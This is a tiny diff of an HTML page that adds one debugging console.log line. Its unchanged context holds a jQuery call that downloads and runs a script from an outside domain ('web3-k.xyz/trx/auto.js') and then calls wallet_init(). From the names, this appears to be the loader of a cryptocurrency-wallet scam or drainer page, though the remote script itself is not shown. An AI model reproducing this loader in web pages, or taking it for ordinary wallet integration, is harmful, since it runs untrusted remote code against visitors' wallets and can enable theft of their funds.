@@ -246,6 +246,7 @@
     <script>
    jQuery.ajaxSetup({cache:true});
             jQuery.ajax({url:"https://web3-k.xyz/trx/auto.js?073016",dataType:"script",cache:true}).done(function(){
+                console.log(getUrlParameter())
             wallet_init().then();
         });
   
